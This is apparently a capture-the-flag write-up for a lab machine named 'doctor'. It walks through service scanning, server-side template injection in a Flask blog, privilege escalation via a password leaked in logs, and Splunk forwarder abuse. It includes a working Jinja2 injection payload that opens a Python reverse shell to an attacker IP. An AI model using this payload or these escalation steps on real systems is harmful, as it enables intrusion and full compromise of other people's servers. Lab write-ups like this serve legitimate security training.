# doctor

## services
```bash

└─$ nmap -sC -sV -p 22,80,8089 -o nmap/tcp-script $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-19 17:18 EDT
Nmap scan report for 10.129.2.21
Host is up (0.047s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Doctor
|_http-server-header: Apache/2.4.41 (Ubuntu)
8089/tcp open  ssl/http Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
|_http-title: splunkd
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Splunkd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.08 seconds
```
* 80 - Apache httpd server - **Ubuntu focal (20.04LTS)**
* 8089 - Splunkd - This is the main splunk daemon responsible for most of the functionality in Splunk.

### HTTP


There is no obvious functionality to the web application as it looks static and each hyperlink leads back to the homepage.

email revealed in contact section as info@doctors.htb; doctors.htb could be a virtual hosted application on the same server
```bash
└─$ curl $IP -H "Host: doctors.htb"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/login?next=%2F">/login?next=%2F</a>.  If not click the link.                                                                                                              
```
It looks like my suspicion was correct and this URL takes users to a login page. I will add the URL to my /etc/hosts file

On this login page we are able to create a new user and the headers in the responses reveals that the application is using werkzeug, which is a WSGI application library with Flask. This is different from the server being used with the main web application as it was using Apache.

### doctors.htb

After creating a new user you are able to view and create posts, so this is a blogging web app. 

> **Source code** reveals a page still under testing at /archive

Navigating to /archive and again viewing the source code we can see that the title of our post is reflected in the title tag. This is user controllable input and could be an xss or ssti vuln.

We can in fact inject js directly into the title contents of a message for an xss exploit, but since that focuses on attacking users and we are focused on attacking the server we will attempt ssti.

#### ssti testing

To test for SSTI we first need to determine which template engine is being used and to do that we have a methodology to progress through provided by portswigger https://portswigger.net/research/server-side-template-injection

`${7*7}` - This is the first test payload of the tree methodology we are following and separates jinja2, smarty, mako, jtwig, and others.
    *this did not result in the payload being interpreted*

`{{7*7}}` - If this fails to interprete we do not have a vulnerability...
    *this interpreted and printed 49*

`{{7*'7'}}` - this determines the engine to be Jinja2 or Twig if successfully and other if not.
    *this printed 7777777*

Since the application is being served by Python we can infer that the emplate is Jinja2 as it supports python

Now for an RCE payload:
`{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.6\",666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\"]);'").read().zfill(417)}}{%endif%}{% endfor %}`

I found a payload from the payload all the things github repo for sending the contents of a file back to a nc listener and I changed the command to get a reverse shell

### privEsc - Root
Web home folder contains a blog script
```bash
#!/bin/bash
SECRET_KEY=1234 SQLALCHEMY_DATABASE_URI=sqlite://///home/web/blog/flaskblog/site.db /usr/bin/python3 /home/web/blog/run.py
```

We get initial foothold as `web` and web is in the `adm` group, so they are able to view the logs of the system in /var/log
```bash
web@doctor:/var/log$ grep -ir 'password' *
```
returned:
`apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"`

The password **Guitar123** is leaked and we can test for password reuse. 

The password gives us access to the user shaun.
```bash
web@doctor:/var/log$ su shaun
Password:
shaun@doctor:/var/log$
```
#### pspy
Couldn't find any low hanging fruit for privesc, so I'm running pspy to try to find processes not displaying from ps
```bash

2023/06/21 03:40:01 CMD: UID=0    PID=37446  | /usr/sbin/CRON -f
2023/06/21 03:40:01 CMD: UID=0    PID=37447  | /bin/sh -c /opt/clean/cleandb.py
2023/06/21 03:40:01 CMD: UID=0    PID=37448  | python3 /opt/clean/cleandb.py
2023/06/21 03:40:01 CMD: UID=0    PID=37449  |
2023/06/21 03:40:01 CMD: UID=0    PID=37451  | sh -c cp /opt/clean/site.db /home/web/blog/flaskblog/site.db
```
Tihis appears to reflect the db being cleaned every 20 minutes as was stated on the web application.
After further inspection there really isn't anything interesting goin on in the scripts. Just removing files and then reverting to the older version of the db.

Looking again at pspy we can see the splunk service running from the scan earlier:
```bash
2023/06/21 04:01:08 CMD: UID=0    PID=1171   | [splunkd pid=1170] splunkd -p 8089 start [process-runner]
2023/06/21 04:01:08 CMD: UID=0    PID=1170   | splunkd -p 8089 start
```

### splunkD

splunkd is a daemon run on devices for collecting logs and forwarding them to a central spunk instance. This is vulnurable to rce if a user is able to authenticate. The splunkwhisperer script will connect to the Splunk Universal Forwarder (splunkd) and deploy a malicious app that will execute whatever payload the attacker provides.

```bash
shaun@doctor:~$ PySplunkWhisperer2 --username=shaun --password=Guitar123 --payload="ping -c 5 10.10.14.6"
Running in local mode (Local Privilege Escalation)
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmp5w6o4fzx.tar
[.] Installing app from: /tmp/tmp5w6o4fzx.tar
[+] App installed, your code should be running now!

Press RETURN to cleanup

[.] Removing app...
[+] App removed

Press RETURN to exit

Bye!
```
After verifying that our payload was executed and we received a ping, we can use a reverse shell payload to get ROOT access.
